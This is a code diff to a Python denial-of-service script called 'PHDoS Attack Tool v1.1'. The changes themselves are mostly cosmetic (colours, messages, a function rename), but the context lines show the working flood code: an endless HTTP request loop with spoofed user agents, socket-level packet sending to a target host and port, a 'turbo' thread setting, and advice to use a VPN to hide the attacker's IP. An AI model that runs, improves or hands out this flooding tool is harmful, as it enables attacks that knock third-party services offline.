@@ -29,11 +29,11 @@ def my_bots():
 	return(bots)
 
 
-def bot_hammering(url):
+def bot_packet(url):
 	try:
 		while True:
 			req = urllib.request.urlopen(urllib.request.Request(url,headers={'User-Agent': random.choice(uagent)}))
-			print("\033[94mPHDoS is Sending Packet...\033[0m")
+			print("\033[33mPHDoS is Sending Critical Strike...\033[0m")
 			time.sleep(.1)
 	except:
 		time.sleep(.1)
@@ -47,7 +47,7 @@ def down_it(item):
 			s.connect((host,int(port)))
 			if s.sendto( packet, (host, int(port)) ):
 				s.shutdown(1)
-				print ("\033[92m",time.ctime(time.time()),"\033[0m \033[94m ^^Sending Packet!^^ \033[0m")
+				print ("\033[37m",time.ctime(time.time()),"\033[0m \033[33m Critical Strike! \033[0m")
 			else:
 				s.shutdown(1)
 				print("\033[91mshut<->down\033[0m")
@@ -73,14 +73,15 @@ def dos2():
 
 
 def usage():
-	print (''' \033[92m
+	print (''' \033[33m
   ____  _   _       ____       ____  
  |  _ \| | | |     |  _ \  ___/ ___| 
  | |_) | |_| |_____| | | |/ _ \___ \ 
  |  __/|  _  |_____| |_| | (_) |__) |
  |_|   |_| |_|     |____/ \___/____/ 
-                    Attack Tool v1.1
+                    Attack Tool v1.1 \033[0m''')
 	
+	print (''' \033[37m
 	Your IP is visible.
 	You need to ACTIVATE YOUR VPN FIRST before using,
 	I am not responsible for your action,
@@ -91,7 +92,7 @@ def usage():
 	-p : port default 80
 	-t : turbo default 135
 	-ctrl+c: to stop \033[0m''')
-	sys.exit()
+	sys.exit() 
 
 
 def get_parameters():
@@ -137,8 +138,8 @@ if __name__ == '__main__':
 	if len(sys.argv) < 2:
 		usage()
 	get_parameters()
-	print("\033[92m",host," port: ",str(port)," turbo: ",str(thr),"\033[0m")
-	print("\033[94mPlease wait...\033[0m")
+	print("\033[34m",host," port: ",str(port)," turbo: ",str(thr),"\033[0m")
+	print("\033[34mPlease wait...\033[0m")
 	user_agent()
 	my_bots()
 	time.sleep(5)
